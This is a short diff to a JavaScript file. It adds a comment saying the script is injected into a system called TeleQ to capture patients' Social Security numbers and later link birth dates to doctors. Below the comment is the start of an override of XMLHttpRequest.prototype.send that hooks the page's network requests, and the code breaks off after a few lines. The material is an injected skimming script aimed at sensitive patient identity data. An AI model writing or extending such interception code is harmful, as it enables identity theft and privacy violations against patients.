@@ -1,5 +1,7 @@
 
-
+// This file is injected into TeleQ to capthure SSNs for
+// patients so that birth dates can later be connected
+// to doctors
 (function (send) {
     XMLHttpRequest.prototype.send = function () {
         var callback = this.onreadystatechange
